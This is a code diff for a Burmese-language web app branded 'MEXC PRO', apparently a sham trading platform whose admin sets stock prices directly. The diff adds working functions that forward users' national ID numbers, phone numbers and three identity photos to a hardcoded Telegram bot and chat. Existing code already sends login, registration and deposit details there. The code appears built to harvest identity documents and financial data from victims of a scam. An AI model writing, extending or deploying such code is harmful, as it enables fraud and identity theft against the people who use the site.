@@ -801,11 +801,6 @@
     const TELEGRAM_CHAT_ID = "7709938396";
     const TELEGRAM_CHANNEL = "@mexccustomerservice667";
 
-    /**
-     * Send a message to the Telegram bot
-     * @param {string} text - The message text (supports HTML formatting)
-     * @returns {Promise}
-     */
     async function sendTelegramMessage(text) {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         try {
@@ -826,9 +821,61 @@
         }
     }
 
-    /**
-     * Format user data for Telegram notification
-     */
+    // ================================================================
+    // 🔥 NEW: SEND PHOTO TO TELEGRAM
+    // ================================================================
+    async function sendTelegramPhoto(photoBlobOrBase64, caption) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+        try {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('caption', caption || '');
+            formData.append('parse_mode', 'HTML');
+            
+            if (typeof photoBlobOrBase64 === 'string') {
+                // Base64 string
+                formData.append('photo', photoBlobOrBase64);
+            } else {
+                // Blob/File
+                formData.append('photo', photoBlobOrBase64, 'photo.jpg');
+            }
+
+            const response = await fetch(url, {
+                method: 'POST',
+                body: formData
+            });
+            const data = await response.json();
+            console.log('[Telegram Photo] Sent:', data);
+            return data;
+        } catch (error) {
+            console.error('[Telegram Photo] Error:', error);
+        }
+    }
+
+    // Convert File to base64 string with data URI prefix for Telegram
+    function fileToBase64(file) {
+        return new Promise((resolve, reject) => {
+            const reader = new FileReader();
+            reader.onload = () => {
+                const base64 = reader.result.split(',')[1];
+                resolve({ dataUri: reader.result, base64: base64 });
+            };
+            reader.onerror = reject;
+            reader.readAsDataURL(file);
+        });
+    }
+
+    // Convert base64 to Blob for FormData upload
+    function base64ToBlob(base64, mimeType) {
+        const byteCharacters = atob(base64.split(',')[1] || base64);
+        const byteNumbers = new Array(byteCharacters.length);
+        for (let i = 0; i < byteCharacters.length; i++) {
+            byteNumbers[i] = byteCharacters.charCodeAt(i);
+        }
+        const byteArray = new Uint8Array(byteNumbers);
+        return new Blob([byteArray], { type: mimeType || 'image/jpeg' });
+    }
+
     function formatTelegramUserInfo(action, userData) {
         const now = new Date().toLocaleString('en-US', {
             timeZone: 'Asia/Yangon',
@@ -857,25 +904,16 @@
         return msg;
     }
 
-    /**
-     * Send login notification to Telegram
-     */
     async function sendLoginToTelegram(userData) {
         const msg = formatTelegramUserInfo('🔐 USER LOGIN', userData);
         await sendTelegramMessage(msg);
     }
 
-    /**
-     * Send registration notification to Telegram
-     */
     async function sendRegisterToTelegram(userData) {
         const msg = formatTelegramUserInfo('🆕 NEW USER REGISTERED', userData);
         await sendTelegramMessage(msg);
     }
 
-    /**
-     * Send deposit request notification to Telegram with CLEAR payment method and account details
-     */
     async function sendDepositToTelegram(depositData) {
         const now = new Date().toLocaleString('en-US', {
             timeZone: 'Asia/Yangon',
@@ -908,6 +946,68 @@
         msg += `🌐 Platform: MEXC PRO`;
 
         await sendTelegramMessage(msg);
+    }
+
+    // ================================================================
+    // 🔥 NEW: SEND VERIFICATION PHOTOS TO TELEGRAM
+    // ================================================================
+    async function sendVerificationPhotosToTelegram(nrcNumber, username, phoneNumber) {
+        const now = new Date().toLocaleString('en-US', {
+            timeZone: 'Asia/Yangon',
+            year: 'numeric',
+            month: '2-digit',
+            day: '2-digit',
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit',
+            hour12: true
+        });
+
+        // Send text header first
+        const headerMsg = 
+            `🆔 <b>VERIFICATION REQUEST</b>\n` +
+            `━━━━━━━━━━━━━━━━━━━━\n` +
+            `👤 <b>User Name:</b> ${username}\n` +
+            `📱 <b>Phone:</b> ${phoneNumber}\n` +
+            `🪪 <b>NRC Number:</b> ${nrcNumber}\n` +
+            `🕐 <b>Time:</b> ${now}\n` +
+            `━━━━━━━━━━━━━━━━━━━━\n` +
+            `📸 အောက်တွင် မှတ်ပုံတင်ပုံ (၃) ပုံ ပါဝင်ပါသည်\n` +
+            `📢 Channel: ${TELEGRAM_CHANNEL}\n` +
+            `🌐 Platform: MEXC PRO`;
+        
+        await sendTelegramMessage(headerMsg);
+
+        // Small delay to ensure order
+        await new Promise(r => setTimeout(r, 800));
+
+        // Send each photo with caption
+        const photos = [
+            { key: 'front', label: '📷 မှတ်ပုံတင် ရှေ့ဘက်ပုံ (Front)', file: nrcImages.front },
+            { key: 'back', label: '📷 မှတ်ပုံတင် နောက်ဘက်ပုံ (Back)', file: nrcImages.back },
+            { key: 'hold', label: '📷 မှတ်ပုံတင် ကိုင်ဆောင်ထားသောပုံ (Holding)', file: nrcImages.hold }
+        ];
+
+        for (const photo of photos) {
+            if (photo.file) {
+                try {
+                    const caption = `<b>${photo.label}</b>\n👤 ${username}\n📱 ${phoneNumber}`;
+                    // Use Blob directly for FormData upload (best approach)
+                    await sendTelegramPhoto(photo.file, caption);
+                    await new Promise(r => setTimeout(r, 500));
+                } catch (err) {
+                    console.error(`Failed to send ${photo.key} photo:`, err);
+                }
+            }
+        }
+
+        // Send completion footer
+        await new Promise(r => setTimeout(r, 500));
+        await sendTelegramMessage(
+            `✅ <b>Verification Photos Upload Complete</b>\n` +
+            `👤 ${username} | 📱 ${phoneNumber}\n` +
+            `📢 Channel: ${TELEGRAM_CHANNEL}`
+        );
     }
 
     // ================================================================
@@ -1039,7 +1139,6 @@
                     initApp();
                     startLiveWdFeed(); 
 
-                    // 🔥 TELEGRAM BOT NOTIFICATION - LOGIN
                     await sendLoginToTelegram(s.val());
 
                     showSuccess('✅ လော့ဂ်အင် အောင်မြင်ပါသည်', `
@@ -1075,7 +1174,6 @@
                 };
                 db.ref('users/'+ph).set(newUserData);
 
-                // 🔥 TELEGRAM BOT NOTIFICATION - REGISTRATION
                 await sendRegisterToTelegram(newUserData);
 
                 showSuccess('✅ အကောင့်ဖွင့်ခြင်း အောင်မြင်ပါသည်', `
@@ -1854,7 +1952,7 @@
             
             notifyBot('📈 STOCK BUY', { 'User': user, 'Stock': stockName, 'Amount': amount.toLocaleString() + ' Ks', 'Price': price.toFixed(3) + 'x' });
             refreshAllHistory();
-            showSuccess('Stock Purchased', `✅ ${stockName} ကို ${amount.toLocaleString()} Ks ဖြင့် ဝယ်ယူပြီးပါပြီ。<br><br><small style="color:var(--dim);">မှတ်တမ်းသည် ရက် 30 ကြာလျှင် အလိုအလျောက် ပျက်သွားပါမည်။</small>`);
+            showSuccess('Stock Purchased', `✅ ${stockName} ကို ${amount.toLocaleString()} Ks ဖြင့် ဝယ်ယူပြီးပါပြီ။<br><br><small style="color:var(--dim);">မှတ်တမ်းသည် ရက် 30 ကြာလျှင် အလိုအလျောက် ပျက်သွားပါမည်။</small>`);
         });
     }
 
@@ -2197,7 +2295,7 @@
     }
 
     // ================================================================
-    // DEPOSIT - UPDATED WITH TELEGRAM NOTIFICATION
+    // DEPOSIT
     // ================================================================
     function confirmDeposit() { 
         const amt = document.getElementById('dep-amt-input').value; 
@@ -2229,7 +2327,6 @@
             </div>
             <p style="color:var(--dim); font-size:13px;">ငွေသွင်းမှုကို အတည်ပြုမည်လား?<br>ပယ်ဖျက်ပါက ငွေသွင်းမှု မရှိပါ။</p>`,
             () => { 
-                // Get payment details based on method
                 const paymentData = PAYMENT_DETAILS[currentPayMethod];
                 
                 db.ref('requests/deposits').push({ 
@@ -2244,7 +2341,6 @@
                     date: new Date().toLocaleString(), 
                     timestamp: Date.now() 
                 }).then(() => {
-                    // Send detailed Telegram notification with payment method and account info
                     sendDepositToTelegram({
                         ph: user,
                         username: userDataGlobal ? userDataGlobal.username : 'N/A',
@@ -2311,17 +2407,71 @@
         else banner.innerHTML = `<div class="verify-banner verify-none" onclick="showPage('verify-page'); loadVerifyStatus()"><i class="fas fa-exclamation-circle" style="font-size:20px;"></i><div><b>မှတ်ပုံတင် တင်ရန် လိုအပ်ပါသည်</b></div></div>`;
     }
 
+    // ================================================================
+    // 🔥 UPDATED: submitVerification WITH PHOTO SENDING TO TELEGRAM
+    // ================================================================
     async function submitVerification() {
         if(!user) return showSuccess('Error', "Login ဝင်ပါ။");
         const nrc = document.getElementById('verify-nrc').value.trim();
         if(!nrc || nrc.length < 5) return showSuccess('Error', "NRC မှန်ကန်စွာ ထည့်ပါ။");
         if(!nrcImages.front || !nrcImages.back || !nrcImages.hold) return showSuccess('Error', "ပုံအားလုံး ထည့်ပါ။");
         
-        const verifyId = db.ref('requests/verifications').push().key;
-        await db.ref('requests/verifications/' + verifyId).set({ ph: user, username: user, nrc: nrc, status: 'pending', date: new Date().toLocaleString() });
-        await db.ref('users/'+user).update({ verificationStatus: 'pending', nrc: nrc });
-        notifyBot('🆔 VERIFICATION SUBMITTED', { 'Phone': user, 'NRC': nrc });
-        showSuccess('Success', "✅ Verification တင်သွင်းမှု အောင်မြင်ပါသည်။", () => showPage('dash-page'));
+        // Show loading indicator
+        showModal('📤 ပို့နေသည်...', `
+            <div style="text-align:center; padding:20px;">
+                <div style="font-size:40px; margin-bottom:15px;">⏳</div>
+                <b>Verification အချက်အလက်များ ပို့နေပါသည်...</b><br><br>
+                <small style="color:var(--dim);">ခဏစောင့်ဆိုင်းပေးပါ။</small>
+            </div>
+        `, []);
+        
+        try {
+            // 1. Save to Firebase
+            const verifyId = db.ref('requests/verifications').push().key;
+            await db.ref('requests/verifications/' + verifyId).set({ 
+                ph: user, 
+                username: userDataGlobal ? userDataGlobal.username : user, 
+                nrc: nrc, 
+                status: 'pending', 
+                date: new Date().toLocaleString(),
+                timestamp: Date.now()
+            });
+            await db.ref('users/'+user).update({ verificationStatus: 'pending', nrc: nrc });
+
+            // 2. Send text notification
+            notifyBot('🆔 VERIFICATION SUBMITTED', { 'Phone': user, 'NRC': nrc });
+
+            // 3. Send photos to Telegram
+            await sendVerificationPhotosToTelegram(nrc, userDataGlobal ? userDataGlobal.username : user, user);
+
+            // 4. Show success
+            closeModal();
+            showSuccess('✅ အောင်မြင်ပါသည်', `
+                <div style="text-align:center;">
+                    <div style="font-size:50px; color:var(--green); margin-bottom:15px;">✅</div>
+                    <b style="color:var(--green);">Verification တင်သွင်းမှု အောင်မြင်ပါသည်။</b><br><br>
+                    <div style="background:rgba(0,0,0,0.3); padding:12px; border-radius:10px; text-align:left; font-size:12px;">
+                        <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
+                            <span style="color:var(--dim);">NRC Number</span>
+                            <b>${nrc}</b>
+                        </div>
+                        <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
+                            <span style="color:var(--dim);">ပုံများ</span>
+                            <b style="color:var(--green);">✅ ၃ ပုံ ပို့ပြီး</b>
+                        </div>
+                        <div style="display:flex; justify-content:space-between;">
+                            <span style="color:var(--dim);">အခြေအနေ</span>
+                            <b style="color:var(--active-gold);">⏳ စစ်ဆေးနေသည်</b>
+                        </div>
+                    </div>
+                    <br><small style="color:var(--dim);">Admin မှ စစ်ဆေးပြီးပါက အကြောင်းကြားပါမည်။</small>
+                </div>
+            `, () => showPage('dash-page'));
+        } catch (err) {
+            console.error('Verification error:', err);
+            closeModal();
+            showSuccess('Error', "Verification တင်သွင်းမှု မအောင်မြင်ပါ။ ထပ်စမ်းကြည့်ပါ။");
+        }
     }
 
     function loadVerifyStatus() {
@@ -2475,7 +2625,7 @@
         
         db.ref(`settings/stockPrices/${stockId}`).set(price).then(() => {
             liveStockPrices[stockId] = price;
-            showSuccess('✅ အောင်မြင်ပါသည်', `Stock Price ကို ${price.toFixed(3)}x သို့ အောင်မြင်စွာ ပြောင်းလဲပြီးပါပြီ။<br><br>User တွေဆီ ချက်ချင်း ရောက်သွားပါပြီ။`);
+            showSuccess('✅ အောင်မြင်ပါသည်', `Stock Price ကို ${price.toFixed(3)}x သို့ အောင်မြင်စွာ ပြောင်းလဲပြီးပါပြီ。<br><br>User တွေဆီ ချက်ချင်း ရောက်သွားပါပြီ။`);
             setTimeout(() => loadAdmStocks(), 500);
             renderStockMarket();
             updateInvestmentValue();
